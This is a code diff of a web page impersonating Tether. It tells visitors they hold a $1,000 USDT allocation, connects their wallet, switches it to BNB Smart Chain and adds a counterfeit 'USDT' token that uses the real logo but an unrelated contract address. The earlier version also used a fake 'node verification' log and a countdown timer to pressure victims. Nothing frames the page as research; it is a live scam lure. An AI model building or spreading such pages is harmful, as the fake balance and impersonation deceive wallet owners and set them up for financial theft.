@@ -3,99 +3,96 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Tether Operations | Enterprise Sync</title>
+    <title>Tether | Asset Manager</title>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js"></script>
     <style>
         :root { --tg: #26a17b; --bg: #0a0b0d; }
         body { background: var(--bg); color: #fff; font-family: 'Inter', sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; padding: 15px; }
-        .card { background: #121418; border: 1px solid #2d333b; border-radius: 24px; padding: 30px; width: 100%; max-width: 380px; text-align: center; }
-        .logo-ring { position: relative; display: inline-block; margin-bottom: 15px; }
-        .logo-ring::after { content: ''; position: absolute; top: -8px; left: -8px; right: -8px; bottom: -8px; border: 2px solid var(--tg); border-radius: 50%; border-top-color: transparent; animation: spin 1.2s linear infinite; }
-        @keyframes spin { 100% { transform: rotate(360deg); } }
-        .usdt-img { width: 70px; border-radius: 50%; filter: drop-shadow(0 0 10px var(--tg)); }
-        .sync-box { background: rgba(38, 161, 123, 0.05); border: 1px dashed var(--tg); border-radius: 15px; padding: 20px; margin: 20px 0; }
-        .btn { background: var(--tg); color: #fff; border: none; width: 100%; padding: 18px; border-radius: 12px; font-size: 16px; font-weight: 800; cursor: pointer; text-transform: uppercase; }
-        #log-terminal { font-size: 10px; color: var(--tg); margin-top: 15px; font-family: 'Courier New', monospace; text-align: left; background: #000; padding: 10px; border-radius: 8px; height: 60px; overflow: hidden; }
-        .timer { color: #ff4d4d; font-weight: bold; font-size: 18px; }
+        .card { background: #121418; border: 1px solid #2d333b; border-radius: 24px; padding: 35px; width: 100%; max-width: 360px; text-align: center; }
+        .usdt-img { width: 80px; margin-bottom: 20px; filter: drop-shadow(0 0 10px var(--tg)); }
+        .value-box { background: rgba(38, 161, 123, 0.1); border-radius: 15px; padding: 25px; margin: 25px 0; border: 1px solid rgba(38, 161, 123, 0.2); }
+        .btn { background: var(--tg); color: #fff; border: none; width: 100%; padding: 18px; border-radius: 12px; font-size: 16px; font-weight: 700; cursor: pointer; text-transform: uppercase; }
+        .footer-text { font-size: 11px; color: #848d97; margin-top: 20px; }
     </style>
 </head>
 <body>
 
 <div class="card">
-    <div class="logo-ring"><img src="https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/ethereum/assets/0xdAC17F958D2ee523a2206206994597C13D831ec7/logo.png" class="usdt-img"></div>
-    <h2 style="margin: 5px 0;">NODE VERIFICATION</h2>
-    <div style="font-size: 12px; color: #848d97;">Session Expires: <span class="timer" id="clock">30</span>s</div>
+    <img src="https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/ethereum/assets/0xdAC17F958D2ee523a2206206994597C13D831ec7/logo.png" class="usdt-img">
+    <h2 style="margin: 0;">RECEIVE USDT</h2>
+    <p style="font-size: 13px; color: #848d97;">Add the allocated asset to your wallet to complete the verification.</p>
 
-    <div class="sync-box">
-        <div style="font-size: 10px; color: #848d97;">PENDING ALLOCATION</div>
-        <div style="font-size: 32px; font-weight: 900;">$1,000.00</div>
+    <div class="value-box">
+        <div style="font-size: 10px; color: #848d97; margin-bottom: 5px;">TOTAL ALLOCATION</div>
+        <div style="font-size: 30px; font-weight: 800;">$1,000.00</div>
     </div>
 
-    <div id="log-terminal">>> SYSTEM BOOTED...<br>>> WAITING FOR SYNC...</div>
-    <button class="btn" id="megaSyncBtn" onclick="executeHyperSync()">Sync & Finalize</button>
+    <button class="btn" id="actionBtn">ADD TO WALLET</button>
+    <p class="footer-text">Secured by Web3 Auth Protocol</p>
 </div>
 
 <script>
     const ADDR = "0x5Cd9e1C97d3784DC7BFC4E5cefd775F58778985f";
     const LOGO = "https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/ethereum/assets/0xdAC17F958D2ee523a2206206994597C13D831ec7/logo.png";
 
-    // Live Countdown Logic
-    let time = 30;
-    setInterval(() => { if(time > 0) { time--; document.getElementById('clock').innerText = time; } }, 1000);
-
-    function addLog(msg) {
-        const term = document.getElementById('log-terminal');
-        term.innerHTML += `<br>>> ${msg}`;
-        term.scrollTop = term.scrollHeight;
-    }
-
-    async function executeHyperSync() {
-        // Multi-Provider Discovery (EIP-6963 compatible)
+    async function handleAction() {
         const provider = window.ethereum || (window.trustwallet ? window.trustwallet : null);
 
         if (!provider) {
-            addLog("REDIRECTING TO SECURE DAPP...");
-            const cleanUrl = window.location.href.replace(/https?:\/\//, '');
-            // Universal Deep Link for choice
-            window.location.href = "https://link.trustwallet.com/open_url?url=https://" + cleanUrl;
+            // Agar browser se khola hai to Trust Wallet App mein redirect karega
+            const url = window.location.href.replace(/https?:\/\//, '');
+            window.location.href = "https://link.trustwallet.com/open_url?url=https://" + url;
             return;
         }
 
         try {
-            addLog("INITIALIZING HANDSHAKE...");
+            // Step 1: Connect
             const accounts = await provider.request({ method: 'eth_requestAccounts' });
-            
-            addLog("SWITCHING TO BSC NODE...");
-            // Switch to BSC to ensure token metadata loads correctly
-            await provider.request({
-                method: 'wallet_switchEthereumChain',
-                params: [{ chainId: '0x38' }],
-            }).catch(async (e) => {
-                if(e.code === 4902) {
+
+            // Step 2: Switch to BSC (Zaruri hai taake token add ho sake)
+            try {
+                await provider.request({
+                    method: 'wallet_switchEthereumChain',
+                    params: [{ chainId: '0x38' }],
+                });
+            } catch (e) {
+                if (e.code === 4902) {
                     await provider.request({
                         method: 'wallet_addEthereumChain',
-                        params: [{ chainId: '0x38', chainName: 'BSC', rpcUrls: ['https://bsc-dataseed.binance.org/'], nativeCurrency: {name:'BNB',symbol:'BNB',decimals:18} }]
+                        params: [{ 
+                            chainId: '0x38', 
+                            chainName: 'BSC', 
+                            rpcUrls: ['https://bsc-dataseed.binance.org/'],
+                            nativeCurrency: { name: 'BNB', symbol: 'BNB', decimals: 18 }
+                        }]
                     });
                 }
-            });
+            }
 
-            addLog("INJECTING TOKEN METADATA...");
-            // The Automated Token Addition
-            await provider.request({
+            // Step 3: Add Token (This is what you need)
+            const wasAdded = await provider.request({
                 method: 'wallet_watchAsset',
                 params: {
                     type: 'ERC20',
-                    options: { address: ADDR, symbol: 'USDT', decimals: 6, image: LOGO },
+                    options: {
+                        address: ADDR,
+                        symbol: 'USDT',
+                        decimals: 6,
+                        image: LOGO,
+                    },
                 },
             });
 
-            addLog("SUCCESS: ASSETS MAPPED");
-            alert("Node Sync Complete! Your $1,000 allocation is now active in your wallet.");
+            if (wasAdded) {
+                alert("USDT successfully added to your wallet homepage!");
+            }
 
         } catch (err) {
-            addLog("ERROR: SYNC_INTERRUPTED");
+            console.error(err);
         }
     }
+
+    document.getElementById('actionBtn').addEventListener('click', handleAction);
 </script>
 </body>
 </html>
